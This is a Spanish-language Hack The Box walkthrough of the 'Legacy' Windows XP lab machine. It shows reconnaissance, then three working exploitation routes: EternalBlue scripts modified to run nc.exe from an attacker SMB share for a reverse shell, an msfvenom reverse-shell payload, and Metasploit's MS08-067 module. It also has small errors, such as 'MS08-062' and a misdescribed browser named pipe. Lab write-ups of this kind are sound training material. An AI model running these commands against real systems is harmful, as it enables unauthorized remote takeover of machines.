---
title: "Legacy - Hack The Box"
date: 2023-02-13
draft: false
slug: "htb-writeup-legacy"
excerpt: "Una máquina no tan complicada, ya que vamos a utilizar un Exploit que ya hemos usado antes con la máquina Blue, la diferencia radica en los named pipes activos en el servicio Samba que está activo, hay varias manera de aprovecharnos de este, vamos a probar 3 diferentes.."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "SMB", "Remote Command Execution (RCE)", "Eternal Blue MS17-010 (RCE)", "Malicious Payload", "Reverse Shell", "Privesc - Eternal Blue MS17-010 (RCE)", "Microsoft Windows Server Code Execution MS08-067 (MWSCE MS08-067)", "Privesc - MWSCE MS08-067", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "smbclient"
  - "python2"
  - "Impacket"
  - "smbserver.py"
  - "git"
  - "tcpdump"
  - "locate"
  - "msfvenom"
  - "nc"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/windows/smb/ms08_067_netapi"
links:
  - "https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/"
  - "https://github.com/EEsshq/CVE-2017-0144---EtneralBlue-MS17-010-Remote-Code-Execution"
  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143"
  - "https://github.com/worawit/MS17-010"
  - "https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/"
  - "https://github.com/helviojunior/MS17-010"
  - "https://malwaretips.com/blogs/browser-exe-what-it-is-should-i-remove-it/"
  - "https://www.processlibrary.com/es/directory/files/spoolss/24800/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-legacy/legacy_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Realizamos un ping hacia la máquina para ver si está conectada y con el TTL vemos que tipo SO ocupa.
```bash
ping -c 4 10.10.10.4         
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=131 ms
64 bytes from 10.10.10.4: icmp_seq=2 ttl=127 time=132 ms
64 bytes from 10.10.10.4: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.4: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.4 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 131.009/131.220/131.604/0.227 ms
```
Gracias al TLL sabemos que es una máquina con Windows, ahora hagamos los escaneos.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:53 CST
Initiating SYN Stealth Scan at 13:53
Scanning 10.10.10.4 [65535 ports]
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 135/tcp on 10.10.10.4
Completed SYN Stealth Scan at 13:54, 23.60s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.44s latency).
Scanned at 2023-02-13 13:53:49 CST for 23s
Not shown: 36144 closed tcp ports (reset), 29388 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
           Raw packets sent: 114947 (5.058MB) | Rcvd: 36606 (1.464MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay 3 puertos abiertos y ya conocidos, observa que está usando el **servicio SMB** y vemos un puerto desconocido. Hagamos el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p135,139,445 10.10.10.4 -oN targeted                                             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:57 CST
Nmap scan report for 10.10.10.4
Host is up (0.13s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:

|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m40s, deviation: 2h07m16s, median: 4d22h57m40s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b995fd (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-04-02T00:55:16+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Al parecer, podemos conectarnos al **servicio SMB** como usuarios sin autenticación. Vamos a tratar de listar los recursos compartidos.
```bash
smbclient -L 10.10.10.4 -N 
session setup failed: NT_STATUS_INVALID_PARAMETER
```
No pues no, entonces es momento de investigar por internet un Exploit que nos sirva.

## Análisis de Vulnerabilidades {#Analisis}

### Investigando Vulnerabilidades con NMAP {#SMB}

Como ya vimos, la máquina ocupa el **servicio SMB**, vamos a aplicar algunos comandos con **nmap** para saber si tiene alguna vulnerabilidad:
```bash
nmap --script "vuln and safe" -p 445 10.10.10.4 -oN vulns
Starting Nmap 7.93 ( https://nmap.org ) CST
Nmap scan report for 10.10.10.4
Host is up (0.078s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
```
Excelente, ya nos dieron todo lo que necesitamos. 

Incluso, podemos comprobar la versión del **servicio SMB** que estan usando, si es la **versión SMBv1**, quiere decir que es casi totalmente vulnerable:
```bash
nmap --script smb-protocols -p 445 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) CST
Nmap scan report for 10.10.10.4
Host is up (0.078s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:

| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]

Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds
```
Listo, es momento de buscar un Exploit para la máquina víctima.

### Buscando un Exploit {#Exploit}

De acuerdo al escaneo de servicios y de vulnerabilidades, debemos buscar Exploits para el **servicio SMB** en general.

Investigando un poco, saltan a relusir dos Exploits:
* *MS08-067*
* *MS17-010*

Que como podras ver, el **MS17-010** es el **Eternal Blue**. El otro que encontramos lo utiliza **Metasploit**, así que vamos a probar primero con el **Eternal Blue**.
```bash
searchsploit MS17-010               
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metaspl | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                              | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                           | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)       | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                 | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)              | windows_x86-64/remote/41987.py

|---|---|
Shellcodes: No Results
Papers: No Results
```
Si recordamos un poco la **máquina Blue**, estariamos haciendo lo mismo que hicimos aquella vez al momento de utilizar el Exploit del **EternalBlue**, por lo que vamos a repetir el mismo proceso, pero vamos a utilizar la versión de **GitHub**, ya que es un poco más estable esa versión, al ser ideada para usarse en cualquier versión de **Windows**, pues parece ser que esta máquina usa un **Windows XP**. lo cual nos puede traer problemas con las versiones de este Exploit que ocupemos.

## Explotación de Vulnerabilidades {#Explotacion}

### Configurando y Usando Exploit eternalBlue de GitHub {#Exploit2}

#### Descargando Exploit e Investigando las Named Pipes {#Descarga}

Vamonos por pasos:
* Descargamos el **GitHub**: <a href="https://github.com/worawit/MS17-010" target="_blank">Repositorio de worawit: MS17-010</a>
```bash
git clone https://github.com/worawit/MS17-010       
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 908.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
```

* Entramos al directorio:
```bash
ls
BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  README.md
checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     shellcode
eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               zzz_exploit.py
eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  npp_control.p
```

* Recuerda que hay 2 scripts que vamos a usar:
  * checker.py
  * zzz_exploit.py

El **checker.py** va a buscar un acceso a los **named pipes** y el **zzz_exploit.py** es el EternalBlue, configurado para que sirve en **servicios Windows del 2000 para arriba**. 

* Ahora vamos a usar primero el **checker.py**. **OJO**: Recuerda que para usar el **checker.py**, hay que usar **Python2**:
```bash
python2 checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched
.
=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```
Ya vimos 2 **named pipes** con **OK**, lo que quiere decir que pueden ser vulnerables y son los que el **zzz_exploit.py**, usara para ganar acceso a la máquina. Es momento de configurar el Exploit.

#### Configurando Exploit para su Uso {#Configure}

Abre el script **zzz_exploit.py** y modifica las siguientes lineas:
```bash
USERNAME = ''
PASSWORD = ''

smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
```

Nos pide 2 parámetros, los cuales no tenemos de momento y están esos 2 lineas de código, que estan en la función **smb_pwn**. Aquí, la desventaja es que no nos podemos loguear en el **servicio SMB** a diferencia de lo que podiamos hacer en la **máquina Blue**. Lo que podemos probar es, si con la **named pipe spoolss** o **browser** podemos inyectar código.

Pero, ¿qué son las **named pipes spoolss y browser**?

| **Spoolss.exe** |
|:-----------:|
| *El spoolss.exe es un proceso que pertenece a Microsoft Windows Operating System. El archivo se carga en la memoria principal (RAM) y funciona ahí como un proceso de Microsoft Printer Spooler Subsystem (también denominado una tarea).El archvio spoolss.exe es un proceso del sistema necesario para que su PC funcione correctamente. No debe eliminarse* |

| **Browser.exe** |
|:-----------:|
| *Browser.exe es un proceso legítimo asociado a navegadores web como Google Chrome, Mozilla Firefox y Microsoft Edge. Forma parte del archivo ejecutable del navegador y se encarga de iniciarlo y ejecutarlo. Al abrir un navegador web, se inicia el proceso Browser.exe, que permanece activo hasta que se cierra el navegador. Browser es un acceso por red al servidor de Windows* |

Entonces sería mejor probar por el **Browser** para ver si se puede inyectar código, intentemos lanzar una **Traza ICMP** de la máquina víctima, hacia nuestra máquina. Para hacer esto, modifiquemos el script **zzz_exploit.py**, para que aplique el ping a nuestra máquina:
```bash
service_exec(conn, r'cmd /c ping Tu_IP')
```

Levantamos un servidor con **tcpdump** para que capture la traza y con esto comprobamos si se inyecto el comando o no:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Probamos el Exploit:
```bash
python2 zzz_exploit.py 10.10.10.4 browser
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86466990
SESSION: 0xe1599948
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
...
```

Observa como en el **tcpdump** esta capturando la **traza ICMP**, entonces si es posible la inyección de comandos, osea que la máquina es vulnerable. Vamos a intentar subir una **netcat** desde ahí, para tratar de conectarnos de manera remota a la máquina. Vamos por pasos:

* Busquemos una **netcat**, en Kali ya tenemos una por defecto, solo tienes que buscarla con el comando **locate** y copiarla donde la vayas a ocupar:
```bash
locate nc.exe 
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
cp /usr/share/windows-resources/binaries/nc.exe .
ls           
BUG.txt                  eternalblue_exploit8.py  eternalchampion_poc.py  eternalsynergy_leak.py  mysmb.pyc       README.md
checker.py               eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py   nc.exe          shellcode
eternal-blue.exe         eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py      npp_control.py  zzz_exploit.py
eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py                __pycache__
```

* Ahora dentro del script **zzz_exploit.py**, vamos a indicar lo siguiente:
```bash
service_exec(conn, r'cmd /c \\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP Cualquier_Puerto')
```
Esto lo que hará, será descargar la **netcat** de un servidor **SMB** que vamos a crear con **impacket** y que se alzará en la carpeta en donde tengamos la **nc.exe**.

* Ahora vamos a alzar el **servidor SMB**:
```bash
smbserver.py smbFolder $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

* Una vez alzado, activamos una **netcat** en nuestra máquina. Aca puedes usar tambien **rlwrap**, pero no lo veo tan necesario, por eso usamos **netcat**:
```bash
nc -nvlp 443           
listening on [any] 443 ...
```

* Por último, activamos el Exploit y listo:
```bash
nc -nvlp 443           
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.4] 1037
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```
Gracias al **Eternal Blue**, entramos directamente como **NT Authority System**, aunque me parece extraño que no podamos usar el comando **whoami**. 

* Ya solo buscamos las flags y ya tendríamos lista esta máquina:
```batch
C:\WINDOWS\system32>cd C:\
cd C:\
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B
 Directory of C:\
16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
29/12/2017  11:41 ��    <DIR>          Program Files
02/04/2023  02:43 ��                 0 pwned.txt
18/05/2022  03:10 ��    <DIR>          WINDOWS
               3 File(s)              0 bytes
               3 Dir(s)   6.403.969.024 bytes free
C:\>cd "Documents and Settings"
cd "Documents and Settings"
C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B
 Directory of C:\Documents and Settings
16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.403.964.928 bytes free
```
Las flags están en **John** y **Administrator**.

Bueno, existen otras dos formas de poder ganar acceso a esta máquina, una será usando una variante del Exploit de **GitHub** que ya usamos, y la otra será usando el **Metasploit Framework**, así que, primero vamos a probar la variante.

### Variante de Exploit eternalBlue de GitHub {#Exploit3}

Esta forma la encontré usando el método que se usó en el siguiente link: 
* <a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/" target="_blank">Exploiting MS17-010 without Metasploit (Win XP SP3)</a>

Vamos a descargar el siguiente repositorio: 
* <a href="https://github.com/helviojunior/MS17-010" target="_blank">Repositorio de helviojunior: MS17-010</a>

Este que contiene una variante del **zzz_exploit.py** que, por así decirlo, nos automatiza un poco el proceso, pues ya solo tendríamos que comentar un par de líneas y debemos crear un Payload con **Msfvenom** como en la **máquina Blue**.
```bash
git clone https://github.com/helviojunior/MS17-010.git
Clonando en 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Recibiendo objetos: 100% (202/202), 118.50 KiB | 905.00 KiB/s, listo.
Resolviendo deltas: 100% (115/115), listo.
.
ls
BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  npp_control.py       zzz_exploit.py
checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     README.md
eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               send_and_execute.py
eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  mysmb.pyc              shellcode
```

* La variante se llama **send_and_execute.py** y no es necesario que la modifiquemos, pero si necesitamos un Payload que será una Reverse Shell para podernos conectar a la máquina víctima.

* Muy bien, ahora hagamos el Payload con **Msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=Tu_IP LPORT=443 -o Eternal_Blue.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: Eternal_Blue.exe
```

* Si bien esta es una forma, también podemos especificar la plataforma y la arquitectura del sistema operativo así:
```bash
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=Tu_IP LPORT=443 EXITFUNC=thread -a x86 --platform windows -o Eternal_Blue.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: Eternal_Blue.exe
```

* Ya con esto tenemos todo preparado, ya solo activamos una **netcat** antes del final:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Y activamos el Exploit:
```bash
python2 send_and_execute.py 10.10.10.4 Eternal_Blue.exe                                    
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86059da8
SESSION: 0xe228e3e8
...
```

* Vemos la **netcat** y ya estamos dentro:
```batch
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.4] 1038
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
.
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
.
C:\WINDOWS\system32>cd C:\
cd C:\
.
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B
.
 Directory of C:\
.
16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
02/04/2023  03:11 ��            73.802 ETYX3D.exe
29/12/2017  11:41 ��    <DIR>          Program Files
02/04/2023  02:43 ��                 0 pwned.txt
18/05/2022  03:10 ��    <DIR>          WINDOWS
               4 File(s)         73.802 bytes
               3 Dir(s)   6.403.895.296 bytes free
```

**Nota**: 
Aquí lo que hace es cargar el archivo **ETYX3D.exe**, dicho archivo es el que se crea en la función **send_and_execute**, así que este es el que entiendo hace la conexión hacia nuestra **netcat**.

### Usando Exploit MS08-062 de Metasploit {#Exploit4}

Como había mencionado antes, había encontrado el **MS08-062**, bueno este se encuentra en el **Metasploit Framework** y lo podemos usar. Vamos a activar el **Metasploit**:
```bash
msfdb start                                                                                
[+] Starting database
msfconsole
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                                                                                            
                                        -+dHJ5aGFyZGVyIQ==+-                                                                                         
                                    `:sm⏣~~Destroy.No.Data~~s:`                                                                                      
                                 -+h2~~Maintain.No.Persistence~~h+-                                                                                  
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`                                                                               
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.                                                                           
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-                                                                        
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-                                                                       
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:                                                                       
                      :we're.all.alike'`                     The.PFYroy.No.D7:                                                                       
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:                                                                       
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:                                                                       
                      :---srwxrwx:-.`                        `MS146.52.No.Per:                                                                       
                      :<script>.Ac816/                        sENbove3101.404:                                                                       
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:                                                                       
                      :09.14.2011.raid                       /STFU|wall.No.Pr:                                                                       
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:                                                                       
                      :#OUTHOUSE-  -s:                       /corykennedyData:                                                                       
                      :$nmap -oS                              SSo.6178306Ence:                                                                       
                      :Awsm.da:                            /shMTl#beats3o.No.:                                                                       
                      :Ring0:                             `dDestRoyREXKC3ta/M:                                                                       
                      :23d:                               sSETEC.ASTRONOMYist:                                                                       
                       /-                        /yo-    .ence.N:(){ :|: & };:                                                                       
                                                 `:Shall.We.Play.A.Game?tron/                                                                        
                                                 ```-ooy.if1ghtf0r+ehUser5`                                                                          
                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                                            
                                              `MjM~~WE.ARE.se~~MMjMs                                                                                 
                                               +~KANSAS.CITY's~-`                                                                                    
                                                J~HAKCERS~./.`                                                                                       
                                                .esc:wq!:`                                                                                           
                                                 +++ATH`                                                                                             
                                                  `                                                                                                  
                                                                                                                                                     

       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE 
true                                                                                                                                                 
Metasploit Documentation: https://docs.metasploit.com/
```

* Buscamos el Exploit:

```bash
msf6 > search MS08-067
.
Matching Modules
================
.
   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
.
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi
```

* Usamos el siguiente modulo:
```bash
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

* Y le pedimos que nos muestre las opciones:
```bash
msf6 exploit(windows/smb/ms08_067_netapi) > show options
.
Module options (exploit/windows/smb/ms08_067_netapi):
.
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
.
.
Payload options (windows/meterpreter/reverse_tcp):
.
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     Tu_IP        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
.
.
Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

* Justo ahí indica que usara el **named pipe Browser**, ya solo es cosa de darle el **RHOSTS** y el **LHOST**:
```bash
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST Tu_IP
LHOST => Tu_IP
```

* Iniciamos el Exploit y listo:
```bash
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
.
[*] Started reverse TCP handler on Tu_IP:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.4:1040) at 2023-03-27 16:53:43 -0600
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > pwd
C:\WINDOWS\system32
```

* Solo es cosa de buscar los mismos directorios donde están las flags y otra vez, hemos vulnerado la máquina:
```bash
meterpreter > cd C:\\
meterpreter > ls
Listing: C:\
============
.
Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2017-03-15 23:30:44 -0600  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2017-03-15 23:30:44 -0600  CONFIG.SYS
040777/rwxrwxrwx  0       dir   2017-03-16 00:07:20 -0600  Documents and Settings
100777/rwxrwxrwx  73802   fil   2023-04-01 18:11:58 -0600  ETYX3D.exe
100444/r--r--r--  0       fil   2017-03-15 23:30:44 -0600  IO.SYS
100444/r--r--r--  0       fil   2017-03-15 23:30:44 -0600  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-13 15:13:04 -0500  NTDETECT.COM
040555/r-xr-xr-x  0       dir   2017-12-29 14:41:18 -0600  Program Files
040777/rwxrwxrwx  0       dir   2017-03-15 23:32:59 -0600  System Volume Information
040777/rwxrwxrwx  0       dir   2022-05-18 07:10:06 -0500  WINDOWS
100777/rwxrwxrwx  73802   fil   2023-04-01 18:21:25 -0600  Y8YP5L.exe
100666/rw-rw-rw-  211     fil   2017-03-15 23:26:58 -0600  boot.ini
100444/r--r--r--  250048  fil   2008-04-13 17:01:44 -0500  ntldr
000000/---------  0       fif   1969-12-31 18:00:00 -0600  pagefile.sys
100666/rw-rw-rw-  0       fil   2023-04-01 17:43:46 -0600  pwned.txt
.
meterpreter > cd "Documents and Settings"
meterpreter > ls
Listing: C:\Documents and Settings
==================================
.
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 00:07:21 -0600  Administrator
040777/rwxrwxrwx  0     dir   2017-03-15 23:29:48 -0600  All Users
040777/rwxrwxrwx  0     dir   2017-03-15 23:33:37 -0600  Default User
040777/rwxrwxrwx  0     dir   2017-03-15 23:32:52 -0600  LocalService
040777/rwxrwxrwx  0     dir   2017-03-15 23:32:43 -0600  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-15 23:33:42 -0600  john
```
Bien podríamos probar los Exploits del **Eternal Blue** que son exclusivos de **Metasploit**, por lo que pueden intentarlo. Solamente chequen que cumpla con los requisitos, que en este caso es que se trate de conectar por el **named pipe Browser**.
